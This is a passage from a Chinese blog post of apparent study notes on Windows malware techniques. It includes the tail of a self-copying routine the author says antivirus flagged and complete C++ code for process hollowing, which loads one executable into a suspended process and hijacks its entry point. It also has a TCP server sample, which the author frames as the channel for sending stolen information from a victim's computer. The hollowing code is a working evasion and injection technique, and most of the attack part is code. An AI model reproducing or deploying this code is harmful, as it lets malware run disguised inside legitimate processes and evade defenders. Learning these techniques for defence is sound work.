class="number">0</span>, Filename, MAX_PATH);</span><br><span class="line">	CreateMyself(Filename, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好家伙，运行直接被火绒杀了，火绒有点凶。<br><img src="https://s2.loli.net/2022/01/22/PTg9ZLQakbmGhCN.png"></p>
<h3 id="傀儡进程-pe映像切换技术"><a href="#傀儡进程-pe映像切换技术" class="headerlink" title="傀儡进程-pe映像切换技术"></a>傀儡进程-pe映像切换技术</h3><p>这个技术我之前也写过文章介绍过，但是没去自己实现下代码，现在来亲自实现下，包括安洵的出题都是用的现成的。</p>
<p>CreateProcess函数创建一个进程前会把该进程映射到虚拟内存中，但是如果我们以挂起模式创建，然后把映射的程序改为另一个程序的映射，就可以达到运行另一个程序的目的了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadNewExeFile</span><span class="params">(CHAR* szNewFilePath,BYTE ** buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line">	DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line"></span><br><span class="line">	hFile = CreateFileA(szNewFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">	*buffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ReadFile(hFile, *buffer, dwFileSize, &amp;dwNumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CheckImageBaseIsSame</span><span class="params">(PROCESS_INFORMATION pi, PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//定义ZwUnmapViewOfSection函数所需要的东西</span></span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PFZWUNMAPVIEWOFSECTION)</span></span></span><br><span class="line"><span class="function">		<span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			HANDLE      ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">			PVOID       BaseAddress</span></span></span><br><span class="line"><span class="function"><span class="params">			)</span></span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">define</span> STATUS_SUCCESS		(0x00000000L) </span></span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwRealImageBase = <span class="number">0</span>;</span><br><span class="line">	DWORD dwFakeImageBase = <span class="number">0</span>;</span><br><span class="line">	CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	FARPROC pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//先获取real.exe的image base</span></span><br><span class="line">	pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">	pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	dwRealImageBase = pIOH-&gt;ImageBase;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取线程上下文</span></span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	<span class="keyword">if</span> (!GetThreadContext(pi.hThread, &amp;ctx))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取fake.exe的image base</span></span><br><span class="line">	<span class="keyword">if</span> (!ReadProcessMemory(</span><br><span class="line">		pi.hProcess,</span><br><span class="line">		(LPCVOID)(ctx.Ebx + <span class="number">8</span>),     <span class="comment">// ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase</span></span><br><span class="line">		&amp;dwFakeImageBase,</span><br><span class="line">		<span class="keyword">sizeof</span>(DWORD),</span><br><span class="line">		<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadProcessMemory() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwFakeImageBase == dwRealImageBase)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//相等则调用ZwUnmapViewOfSection的函数将Fake.exe的PE映像从虚拟内存删除</span></span><br><span class="line">		pFunc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (STATUS_SUCCESS != ((PFZWUNMAPVIEWOFSECTION)pFunc)(pi.hProcess, (PVOID)dwFakeImageBase))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ZwUnmapViewOfSection() failed!!! %d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//不相等则直接将Fake.exe的ImageBase换为Real.exe的</span></span><br><span class="line">		<span class="keyword">if</span> (!WriteProcessMemory(</span><br><span class="line">			pi.hProcess,</span><br><span class="line">			(LPVOID)(ctx.Ebx + <span class="number">8</span>),     <span class="comment">// ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase</span></span><br><span class="line">			&amp;dwRealImageBase,</span><br><span class="line">			<span class="keyword">sizeof</span>(DWORD),</span><br><span class="line">			<span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ImageWrite</span><span class="params">(PROCESS_INFORMATION pi,PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">	PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">	DWORD dImageSize=<span class="number">0</span>;</span><br><span class="line">	DWORD dSectionNum=<span class="number">0</span>;</span><br><span class="line">	LPVOID BaseAddress=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	dImageSize = pIOH-&gt;SizeOfImage;</span><br><span class="line">	dSectionNum = pIFH-&gt;NumberOfSections;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//申请real.exe的ImageBase大小的空间，注意不是文件大小</span></span><br><span class="line">	BaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pIOH-&gt;ImageBase, dImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed !!! %d&quot;</span>,GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//写入头，头的映射无论是在内存还是在文件都是一样的。</span></span><br><span class="line">	<span class="keyword">if</span> (WriteProcessMemory(pi.hProcess, BaseAddress, pbuf, pIOH-&gt;SizeOfHeaders, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!! %d&quot;</span>,GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//for循环写每个节区，BaseAddress + pISH-&gt;VirtualAddress代表每个节区在内存中的位置，pbuf + pISH-&gt;PointerToRawData代表在文件中的位置</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; dSectionNum;i++, pISH++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)BaseAddress + pISH-&gt;VirtualAddress), pbuf + pISH-&gt;PointerToRawData, pISH-&gt;SizeOfRawData, <span class="literal">NULL</span>)==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!!  %d&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">ReplaceProcess</span><span class="params">(CHAR* szFakeFilePath,CHAR* szNewFilePath, PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFOA si;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	CHAR szFilename[MAX_PATH];</span><br><span class="line">	ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	CreateProcessA(szFakeFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断ImageBase是否重叠，第一个参数为什么是传pi的地址，是因为我们要修改pi</span></span><br><span class="line">	CheckImageBaseIsSame(pi, pbuf);</span><br><span class="line">	ImageWrite(pi,pbuf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取上下文</span></span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	<span class="keyword">if</span> (!GetThreadContext(pi.hThread, &amp;ctx))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetThreadContext() failed! %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改为real.exe的EP</span></span><br><span class="line">	ctx.Eax = pIOH-&gt;AddressOfEntryPoint + pIOH-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pbuf !=  <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(pbuf);</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CHAR szNewExePath[MAX_PATH]=<span class="string">&quot;D:\\xor.exe&quot;</span>;</span><br><span class="line">	CHAR szFakeExePath[MAX_PATH] = <span class="string">&quot;D:\\fake.exe&quot;</span>;</span><br><span class="line">	PBYTE buf;</span><br><span class="line"></span><br><span class="line">	ReadNewExeFile(szNewExePath, &amp;buf);</span><br><span class="line">	ReplaceProcess(szFakeExePath,szNewExePath, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>real.exe是个弹窗，我们运行下可以看到。<br><img src="https://s2.loli.net/2022/01/25/QFX5ubOrZE9dvTx.png"></p>
<h2 id="第十章-传输技术"><a href="#第十章-传输技术" class="headerlink" title="第十章-传输技术"></a>第十章-传输技术</h2><p>主要是网络通信相关的知识点，因为想要窃取别人电脑的信息，肯定需要网络来通信，将别人电脑的信息发送到自己电脑上。</p>
<h3 id="Socket-TCP"><a href="#Socket-TCP" class="headerlink" title="Socket-TCP"></a>Socket-TCP</h3><p>TCP通信是需要服务端和客户端的。主要是字节流传输数据。TCP是基于链接的，每条TCP链接只能是点到点的关系。只能是一个ip一个端口。</p>
<p>服务端，主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt; bind 绑定–&gt; listen 监听–&gt;accept 接收请求–&gt; send/recv 发送或接收数据，设计到很多函数，官方文档查就是了。</p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端套接字</span></span><br><span class="line">SOCKET ServerSkt;</span><br><span class="line"><span class="comment">// 客户端套接字</span></span><br><span class="line">SOCKET ClientSkt;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recv</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//接受连接请求</span></span><br><span class="line">	sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">	ClientSkt = accept((SOCKET)lpParam, (sockaddr*)(&amp;addr), &amp;addr_len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;accept success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//接收信息</span></span><br><span class="line">		<span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line">		out = recv(ClientSkt, message, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		message[out] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;recv from client:%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyServer</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> Port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//WSAStartup初始化</span></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//socket 创建套接字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	ServerSkt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ServerSkt == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//配置服务器信息</span></span><br><span class="line">	sockaddr_in server_addr;</span><br><span class="line"></span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">	server_addr.sin_port = htons(Port);</span><br><span class="line">	server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//绑定服务器</span></span><br><span class="line">	<span class="keyword">if</span> (bind(ServerSkt, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//监听</span></span><br><span class="line">	<span class="keyword">if</span> (listen(ServerSkt, <span class="number">10</span>) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;listen Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程来接收客户端的消息</span></span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recv, (LPVOID)ServerSkt, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPCSTR mysIP = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> myPort = <span class="number">12345</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">false</span> == MyServer(mysIP, myPort))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Build_Server Failed!!!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Build_Server success!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buffer[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//发送信息</span></span><br><span class="line">		gets_s(buffer, <span class="number">20</span>);</span><br><span class="line">		send(ClientSkt, buffer, (<span class="number">1</span> + <span class="built_in">strlen</span>(buffer)), <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务端在运行后就会处于等待连接状态，也就是停在accept的位置，等待客户端进行连接，连接成功后就可以发送和接收信息了，这时我们可以用netstat -an命令去看端口信息。<br><img src="https://s2.loli.net/2022/01/14/rYjCNUv12Gw5lhm.png"></p>
<p>客户端，主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt;connect 连接到服务端–&gt; send/recv 发送或接收数据，比服务端的步骤要少一些，而且代码也差不多。</p>
